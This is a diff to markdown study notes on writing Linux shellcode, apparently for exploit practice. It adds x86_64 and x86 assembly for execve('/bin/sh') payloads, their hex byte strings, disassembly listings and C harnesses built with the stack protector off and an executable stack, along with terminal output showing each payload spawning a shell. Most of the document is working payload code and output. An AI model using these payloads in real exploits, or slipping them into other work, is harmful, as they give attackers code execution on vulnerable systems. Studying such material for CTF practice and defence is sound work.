@@ -1,6 +1,7 @@
 # &#35; linux x86_64
 #### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
 #### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>
+#### (dis)assembler : <https://defuse.ca/online-x86-assembler.htm#disassembly/>
 
 ```bash
 $ cat shell64.s
@@ -54,13 +55,14 @@ $ echo "\"$(objdump -d ./shell64 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 
 
 
 $ cat shell64.c
-// gcc -m64 -fno-stack-protector -z execstack shell64.c -o shell64
+// gcc -m64 -fno-stack-protector -z execstack shell64adv.c -o shell64adv
 #include <stdio.h>
 
 int main()
 {
     unsigned char shellcode[] = \
         "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
+    printf("len : %d\n", strlen(shellcode));
     int (*ret)() = (int(*)())shellcode;
     ret();
 }
@@ -70,12 +72,68 @@ $ ./shell64
 $ id
 uid=1000(user) gid=1000(user) groups=1000(user)
 
+
+
+
+
+
+###########################################################
+## using online (dis)assembler
+## https://defuse.ca/online-x86-assembler.htm#disassembly
+###########################################################
+$ cat shell64adv.s
+mov    al,0x3b
+xor    rsi,rsi
+xor    rdx,rdx
+lea    rdi,[rip+0xfffffff8]     
+movabs rcx,0x68732f6e69622f
+
+mov    QWORD PTR [rdi],rcx
+syscall
+###########################################################
+String Literal:
+"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"
+
+Disassembly:
+0:  b0 3b                   mov    al,0x3b
+2:  48 31 f6                xor    rsi,rsi
+5:  48 31 d2                xor    rdx,rdx
+8:  48 8d 3d f8 ff ff ff    lea    rdi,[rip+0xfffffffffffffff8]        # 7 <_main+0x7>
+f:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f6e69622f
+16: 73 68 00
+19: 48 89 0f                mov    QWORD PTR [rdi],rcx
+1c: 0f 05                   syscall
+
+$ cat shell64adv.c
+// gcc -m64 -fno-stack-protector -z execstack shell64adv.c -o shell64adv
+#include <stdio.h>
+
+int main()
+{
+    unsigned char shellcode[] = \
+        "\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05";
+    printf("len : %d\n", sizeof(shellcode));
+    int (*ret)() = (int(*)())shellcode;
+    ret();
+}
+
+$ gcc -m64 -fno-stack-protector -z execstack shell64adv.c -o shell64adv
+$ ./shell64adv
+len : 31
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
+
+
+
+
 ```
 
 
 # &#35; linux x86
 #### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
 #### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>
+#### (dis)assembler : <https://defuse.ca/online-x86-assembler.htm#disassembly/>
 
 ```bash
 $ cat shell32.s
@@ -214,6 +272,58 @@ user@pwn:/home/user$ ps
 11007 pts/3    00:00:00 bash
 11015 pts/3    00:00:00 ps
 user@pwn:/home/user$
+
+
+
+
+###########################################################
+## using online (dis)assembler
+## https://defuse.ca/online-x86-assembler.htm#disassembly
+###########################################################
+$ cat shell32adv.s
+xor    eax,eax
+push   eax
+push   0x68732f2f
+push   0x6e69622f
+mov    ebx,esp
+mov    ecx,eax
+mov    edx,eax
+mov    al,0xb
+int    0x80
+###########################################################
+String Literal:
+"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80"
+
+Disassembly:
+0:  31 c0                   xor    eax,eax
+2:  50                      push   eax
+3:  68 2f 2f 73 68          push   0x68732f2f
+8:  68 2f 62 69 6e          push   0x6e69622f
+d:  89 e3                   mov    ebx,esp
+f:  89 c1                   mov    ecx,eax
+11: 89 c2                   mov    edx,eax
+13: b0 0b                   mov    al,0xb
+15: cd 80                   int    0x80
+
+$ cat shell32adv.c
+// gcc -m32 -fno-stack-protector -z execstack shell32adv.c -o shell32adv
+#include <stdio.h>
+
+int main()
+{
+    unsigned char shellcode[] = \
+        "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80";
+    printf("len : %d\n", sizeof(shellcode));
+    int (*ret)() = (int(*)())shellcode;
+    ret();
+}
+
+$ gcc -m32 -fno-stack-protector -z execstack shell32adv.c -o shell32adv
+$ ./shell32adv
+len : 24
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
 
 ```
 
